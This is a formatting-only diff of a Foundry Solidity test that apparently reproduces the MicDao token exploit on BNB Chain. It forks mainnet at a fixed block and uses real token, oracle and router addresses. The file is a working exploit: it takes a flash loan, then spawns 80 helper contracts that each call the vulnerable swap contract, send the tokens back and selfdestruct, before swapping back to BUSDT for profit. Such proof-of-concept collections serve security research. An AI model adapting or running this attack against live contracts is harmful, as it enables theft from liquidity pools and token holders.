@@ -19,17 +19,13 @@ interface ISwapContract {
 }
 
 contract ContractTest is Test {
-    IERC20 private constant BUSDT =
-        IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IERC20 private constant MicDao =
-        IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
-    IDPPOracle private constant DPPOracle =
-        IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
-    Uni_Router_V2 private constant Router =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    IERC20 private constant MicDao = IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
+    IDPPOracle private constant DPPOracle = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
+    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
     function setUp() public {
-        vm.createSelectFork("bsc", 32711747);
+        vm.createSelectFork("bsc", 32_711_747);
         vm.label(address(BUSDT), "BUSDT");
         vm.label(address(MicDao), "MicDao");
         vm.label(address(DPPOracle), "DPPOracle");
@@ -39,31 +35,17 @@ contract ContractTest is Test {
     function testExploit() public {
         deal(address(BUSDT), address(this), 0);
         emit log_named_decimal_uint(
-            "Attacker BUSDT balance before exploit",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Attacker BUSDT balance before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
 
-        DPPOracle.flashLoan(
-            0,
-            (BUSDT.balanceOf(address(DPPOracle)) * 99) / 100,
-            address(this),
-            abi.encode(0)
-        );
+        DPPOracle.flashLoan(0, (BUSDT.balanceOf(address(DPPOracle)) * 99) / 100, address(this), abi.encode(0));
 
         emit log_named_decimal_uint(
-            "Attacker BUSDT balance after exploit",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Attacker BUSDT balance after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         BUSDT.approve(address(Router), type(uint256).max);
         MicDao.approve(address(Router), type(uint256).max);
         BUSDTToMicDao();
@@ -72,7 +54,7 @@ contract ContractTest is Test {
         uint8 i;
         while (i < 80) {
             HelperContract Helper = new HelperContract();
-            BUSDT.transfer(address(Helper), 2_000 * 1e18);
+            BUSDT.transfer(address(Helper), 2000 * 1e18);
             Helper.work();
             ++i;
         }
@@ -92,11 +74,7 @@ contract ContractTest is Test {
         path[1] = address(MicDao);
 
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            500_000 * 1e18,
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            500_000 * 1e18, 0, path, address(this), block.timestamp + 1000
         );
     }
 
@@ -106,22 +84,15 @@ contract ContractTest is Test {
         path[1] = address(BUSDT);
 
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            MicDao.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            MicDao.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 }
 
 contract HelperContract {
-    ISwapContract private constant SwapContract =
-        ISwapContract(0x19345233ea7486c1D5d780A19F0e303597E480b5);
-    IERC20 private constant BUSDT =
-        IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IERC20 private constant MicDao =
-        IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
+    ISwapContract private constant SwapContract = ISwapContract(0x19345233ea7486c1D5d780A19F0e303597E480b5);
+    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    IERC20 private constant MicDao = IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
     address private immutable owner;
 
     constructor() {
@@ -130,7 +101,7 @@ contract HelperContract {
 
     function work() external {
         BUSDT.approve(address(SwapContract), type(uint256).max);
-        SwapContract.swap(2_000 * 1e18, owner);
+        SwapContract.swap(2000 * 1e18, owner);
         MicDao.transfer(owner, MicDao.balanceOf(address(this)));
         selfdestruct(payable(owner));
     }
